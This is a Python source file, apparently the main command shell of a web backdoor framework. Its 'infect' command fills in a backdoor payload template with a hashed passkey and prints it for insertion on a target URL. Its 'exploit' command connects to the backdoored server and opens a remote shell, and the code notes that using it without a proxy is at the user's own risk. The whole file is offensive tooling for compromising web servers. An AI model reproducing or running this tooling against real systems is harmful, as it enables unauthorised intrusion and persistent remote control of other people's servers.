import re, base64, hashlib

from functions import *
import interface.cmdlib

class Start(interface.cmdlib.Cmd):

    def preloop(self):
        clear()
        softwareLogo  = getpath('misc/txt/logo.ascii').read().rstrip()
        introduction  = getpath('misc/txt/intro.msg').read().strip()
        startMessage  = getpath('misc/txt/start_messages.lst').randline()
        mainShellHelp = getpath('misc/txt/mainShell_help.msg').read().strip()
        self.help     = os.linesep+mainShellHelp+os.linesep

        print softwareLogo
        print ''
        print color(1)
        print introduction
        print color(0,37)
        print startMessage
        print color(0)
        print mainShellHelp
        print ''

        if 'SAVEFILE' in self.CONF['SETTINGS']:
            print P_inf+'Using session saved from '+quot(self.CONF['SETTINGS']['SAVEFILE'])

        if self.CONF['SETTINGS']['PROXY'].lower() in ['','none']:
            print P_err+'No proxy configured ! use it at your own risk...'

        if not 'OPENER' in self.CONF:
            self.CONF['OPENER'] = dict()
        self.updateOpener()


    def updateOpener(self):
        def genHashKey():
            domain  = self.CONF['OPENER']['DOMAIN']
            md5     = hashlib.md5(domain)
            hexVal  = md5.hexdigest()
            b64Val  = base64.b64encode(hexVal)
            hashkey = b64Val[:8]
            self.CONF['OPENER']['HASH'] = hashkey

        def genPayload():
            hashkey  = self.CONF['OPENER']['HASH']
            backdoor = self.CONF['SETTINGS']['BACKDOOR']
            postvar  = self.CONF['SETTINGS']['PASSKEY'].upper().replace('-','_')
            rawPayload = backdoor.replace('%%PASSKEY%%',postvar)
            payload    = rawPayload.replace('%%SRVHASH%%',hashkey)
            self.CONF['OPENER']['BACKDOOR'] = payload

        self.CONF['OPENER']['DOMAIN'] = 'x'
        target = self.CONF['SETTINGS']['TARGET']
        domainParser = '^https?://(.+?)(?:$|/)'
        try:    matchedDomain = re.findall(domainParser,target)[0]
        except: matchedDomain = ''
        if matchedDomain and len(target)>13:
            self.CONF['OPENER']['URL']     = target
            self.CONF['OPENER']['DOMAIN']  = matchedDomain
        else:
            try: del self.CONF['OPENER']['URL']
            except: pass

        genHashKey()
        genPayload()

        self.CONF['OPENER']['PASSKEY'] = self.CONF['SETTINGS']['PASSKEY']
        if self.CONF['OPENER']['PASSKEY'] == "%%SRVHASH%%":
            self.CONF['OPENER']['PASSKEY'] = self.CONF['OPENER']['HASH']


    ######################
    ### COMMAND: clear ###
    def do_clear(self, line):
        clear()
        import pprint
        pprint.pprint(self.CONF)

    #####################
    ### COMMAND: exit ###
    def do_exit(self, line):
        return True

    ####################
    ### COMMAND: set ###
    def help_set(self):
        print 'set'
        print 'View and edit settings.'
        print ''
        print 'Usage:   set'
        print '         set [variable]'
        print '         set [variable] [value]'
        print ''
        print 'Example: set TEXTEDITOR /usr/bin/nano'
        print '         set PROXY None'

    def complete_set(self, text, line, begidx, endidx):
        completions = self.CONF['SETTINGS'].keys()
        if text:
            completions = [x+' ' for x in completions if x.startswith(text)]
        return(completions)

    def do_set(self, line):
        def showStatus(*nameAndVal):
            template = '%s ==> '+color(1)+'%s'+color(0)
            print template % nameAndVal

        if line:
            args = line.strip().split(' ')
            var  = args[0].upper()
            val  = ' '.join(args[1:])
            if var in self.CONF['SETTINGS']:
                if val:
                    oldValue = self.CONF['SETTINGS'][var]
                    self.CONF['SETTINGS'][var] = val
                    import usr.settings
                    if usr.settings.matchConditions(self.CONF['SETTINGS']):
                        showStatus(var, self.CONF['SETTINGS'][var])
                        self.updateOpener()
                    else:
                        self.CONF['SETTINGS'][var] = oldValue
                else:
                    showStatus(var, self.CONF['SETTINGS'][var])
            else:
                self.help_set()
        else:
            items = self.CONF['SETTINGS'].items()
            sortedSettings = dict([(x.upper(),y) for x,y in items])
            import interface.columnizer
            title = "Session settings"
            interface.columnizer.Make(title,sortedSettings).write()

    #######################
    ### COMMAND: infect ###
    def do_infect(self, line):
        if 'URL' in self.CONF['OPENER'] or self.CONF['SETTINGS']['PASSKEY'] != '%%SRVHASH%%':
            payload = self.CONF['OPENER']['BACKDOOR']
            length  = len(payload)
            print ''
            print 'To infect the current target'
            print 'Insert this backdoor on targeted URL:'
            print ''
            print ''+'='*length
            print ''+color(34)+payload+color(0)
            print ''+'='*length
            print ''
        else:
            print P_err+"Undefined target, please enable it with 'set TARGET <backdoored-url>'"

    ########################
    ### COMMAND: exploit ###
    def do_exploit(self, line):
        if 'URL' in self.CONF['OPENER']:
            import framework.exploit
            exploitation = framework.exploit.Start(self.CONF)
            if exploitation.success:
                self.CONF['SERVER'] = exploitation.SERVER
                import remoteShell
                shell = remoteShell.Start()
                shell.setConfig(self.CONF)
                shell.cmdloop()
                exploitation.close()
        else:
            print P_err+"Undefined target, please enable it with 'set TARGET <backdoored-url>'"

    #####################
    ### COMMAND: save ###
    def do_save(self, line):
        import usr.session
        savedFile = usr.session.save(self.CONF, line)
        if savedFile:
            self.CONF['SETTINGS']['SAVEFILE'] = savedFile
